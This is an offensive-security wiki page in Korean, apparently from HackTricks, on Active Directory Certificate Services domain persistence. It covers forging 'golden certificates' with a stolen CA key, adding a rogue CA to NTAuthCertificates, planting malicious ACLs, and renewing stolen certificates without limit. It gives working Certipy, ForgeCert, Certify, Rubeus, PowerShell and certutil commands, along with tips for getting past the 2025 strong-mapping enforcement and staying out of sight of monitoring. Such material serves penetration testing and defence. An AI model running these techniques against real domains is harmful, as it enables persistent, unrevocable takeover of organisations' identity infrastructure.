# AD CS 도메인 지속성

{{#include ../../../banners/hacktricks-training.md}}

**이 문서는 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)에 공유된 도메인 지속성 기법의 요약입니다**. 자세한 내용은 해당 문서를 확인하세요.

## 도난당한 CA 인증서로 인증서 위조 (Golden Certificate) - DPERSIST1

인증서가 CA 인증서인지 어떻게 확인합니까?

다음 조건들이 충족되면 인증서가 CA 인증서임을 판단할 수 있습니다:

- 인증서는 CA 서버에 저장되며, 개인 키는 머신의 DPAPI로 보호되거나 운영체제가 지원하는 경우 TPM/HSM과 같은 하드웨어에 의해 보호됩니다.
- 인증서의 Issuer 및 Subject 필드가 CA의 distinguished name과 일치합니다.
- "CA Version" 확장(extension)은 CA 인증서에만 존재합니다.
- 인증서에는 Extended Key Usage (EKU) 필드가 없습니다.

이 인증서의 개인 키를 추출하는 지원되는 방법은 CA 서버에서 certsrv.msc 도구를 통해 제공되는 내장 GUI입니다. 그럼에도 불구하고 이 인증서는 시스템에 저장된 다른 인증서와 다르지 않으므로, 추출에는 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2)와 같은 방법을 적용할 수 있습니다.

인증서와 개인 키는 또한 Certipy를 사용하여 다음 명령으로 얻을 수 있습니다:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
CA 인증서와 해당 개인 키를 `.pfx` 형식으로 확보한 후, [ForgeCert](https://github.com/GhostPack/ForgeCert) 같은 도구를 사용하여 유효한 인증서를 생성할 수 있습니다:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 인증서 위조의 대상 사용자는 프로세스가 성공하려면 Active Directory에서 활성 상태이며 인증할 수 있어야 합니다. krbtgt와 같은 특수 계정에 대한 인증서 위조는 효과가 없습니다.

이 위조된 인증서는 **지정된 종료일까지 유효**하며 **루트 CA 인증서가 유효한 동안**(일반적으로 5년에서 **10년 이상**) **유효**합니다. 또한 **머신**에도 유효하므로, **S4U2Self**와 결합하면 공격자는 CA 인증서가 유효한 한 **도메인 내 모든 머신에서 지속성을 유지할 수 있습니다**.\
또한 이 방법으로 생성된 **인증서들은 CA가 이를 인지하지 못하므로 취소될 수 없습니다**.

### 강력한 인증서 매핑 강제화(2025+) 하에서 작동

2025년 2월 11일(KB5014754 배포 후)부터 도메인 컨트롤러는 인증서 매핑에 대해 기본적으로 **Full Enforcement**를 사용합니다. 실제로 이는 위조한 인증서가 다음 중 하나를 만족해야 함을 의미합니다:

- 대상 계정에 대한 강력한 바인딩을 포함(예: SID security extension), 또는
- 대상 객체의 `altSecurityIdentities` 속성에 강력하고 명시적인 매핑이 설정되어야 함.

지속성을 위한 신뢰할 수 있는 접근법은 도난당한 Enterprise CA에 체인된 위조 인증서를 발급한 다음 피해자 principal에 강력한 명시적 매핑을 추가하는 것입니다:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
참고
- SID 보안 확장(SID security extension)을 포함하는 위조 인증서를 만들 수 있다면, 이러한 인증서는 Full Enforcement 하에서도 암묵적으로 매핑됩니다. 그렇지 않으면 명시적이고 강력한 매핑을 사용하는 것이 좋습니다. 명시적 매핑에 대해서는 [account-persistence](account-persistence.md)를 참조하세요.
- 폐기는 수비자에게 도움이 되지 않습니다: 위조된 인증서는 CA 데이터베이스에 알려져 있지 않으므로 폐기될 수 없습니다.

#### Full-Enforcement 호환 위조 (SID-aware)

업데이트된 도구는 SID를 직접 삽입할 수 있게 해, DCs가 약한 매핑을 거부할 때에도 golden certificates를 계속 사용할 수 있게 합니다:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SID를 포함하면 모니터링될 수 있는 `altSecurityIdentities`를 건드리지 않아도 되면서도 강력한 매핑 검사를 충족할 수 있습니다.

## 악성 CA 인증서 신뢰하기 - DPERSIST2

`NTAuthCertificates` 객체는 Active Directory (AD)가 사용하는 `cacertificate` 속성에 하나 이상의 **CA 인증서**를 포함하도록 정의되어 있습니다. **domain controller**의 검증 과정은 인증 중인 **인증서**의 Issuer 필드에 지정된 **CA**와 일치하는 항목이 `NTAuthCertificates` 객체에 있는지 확인하는 것입니다. 일치 항목이 있으면 인증이 진행됩니다.

공격자가 이 AD 객체를 제어할 수 있다면, self-signed CA 인증서를 `NTAuthCertificates` 객체에 추가할 수 있습니다. 일반적으로 이 객체를 수정할 수 있는 권한은 **Enterprise Admin** 그룹의 구성원과 **forest root’s domain**의 **Domain Admins** 또는 **Administrators**에게만 부여됩니다. 그들은 `certutil.exe`를 사용하여 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` 명령으로 `NTAuthCertificates` 객체를 편집하거나, [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)를 사용할 수 있습니다.

이 기술에 유용한 추가 명령:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
이 기능은 동적으로 인증서를 생성하기 위해 이전에 설명한 ForgeCert 방법과 함께 사용할 때 특히 관련이 있습니다.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## 악의적 잘못된 구성 - DPERSIST3

AD CS 구성 요소에 대한 **security descriptor modifications of AD CS**를 통한 **persistence** 기회는 풍부합니다. "[Domain Escalation](domain-escalation.md)" 섹션에 설명된 수정은 권한이 상승된 공격자가 악의적으로 구현할 수 있습니다. 여기에는 민감한 구성 요소에 "control rights"(예: WriteOwner/WriteDACL/등)를 추가하는 것이 포함됩니다:

- **CA server’s AD computer** 객체
- **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

악의적 구현의 예로는 도메인에서 **elevated permissions**를 가진 공격자가 기본 **`User`** 인증서 템플릿에 **`WriteOwner`** 권한을 추가하고, 공격자를 해당 권한의 주체로 설정하는 경우가 있습니다. 이를 악용하려면 공격자는 먼저 **`User`** 템플릿의 소유자를 자신으로 변경합니다. 그 다음 템플릿에서 **`mspki-certificate-name-flag`**를 **1**로 설정하여 **`ENROLLEE_SUPPLIES_SUBJECT`**를 활성화하면 사용자가 요청에서 Subject Alternative Name을 제공할 수 있습니다. 이후 공격자는 **template**을 사용해 **enroll**하고 alternative name으로 **domain administrator** 이름을 선택하여 획득한 인증서를 DA로서의 인증에 사용할 수 있습니다.

장기 도메인 persistence를 위해 공격자가 설정할 수 있는 실용적 설정(자세한 내용 및 탐지는 {{#ref}}domain-escalation.md{{#endref}} 참조):

- 요청자(requesters)로부터 SAN을 허용하는 CA 정책 플래그 (예: `EDITF_ATTRIBUTESUBJECTALTNAME2` 활성화). 이는 ESC1 유사 경로를 계속 악용 가능하게 유지합니다.
- 인증 가능한 발급을 허용하는 템플릿 DACL 또는 설정(예: Client Authentication EKU 추가, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 활성화).
- 방어자가 정리를 시도할 경우 악성 발급자를 지속적으로 재도입하기 위해 `NTAuthCertificates` 객체 또는 CA 컨테이너를 제어.

> [!TIP]
> In hardened environments after KB5014754, pairing these misconfigurations with explicit strong mappings (`altSecurityIdentities`) ensures your issued or forged certificates remain usable even when DCs enforce strong mapping.

### 인증서 갱신 남용 (ESC14) for persistence

authentication-capable certificate(또는 Enrollment Agent 인증서)를 탈취하면, 발급 템플릿이 계속 게시되어 있고 귀하의 CA가 여전히 발급자 체인을 신뢰하는 한 해당 인증서를 **renew it indefinitely** 할 수 있습니다. 갱신은 원래의 신원 바인딩을 유지하면서 유효기간을 연장하므로 템플릿이 수정되거나 CA가 재게시되지 않는 한 퇴거(eviction)가 어려워집니다.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
도메인 컨트롤러가 **Full Enforcement** 상태일 경우, 갱신된 리프 인증서가 `altSecurityIdentities`를 건드리지 않고도 계속해서 강한 매핑을 유지하도록 `-sid <victim SID>`를 추가하거나 SID 보안 확장을 포함하는 템플릿을 사용하세요. CA 관리자 권한을 가진 공격자는 또한 스스로 cert를 발급하기 전에 `policy\RenewalValidityPeriodUnits` 값을 조정하여 갱신된 유효기간을 늘릴 수 있습니다.


## References

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
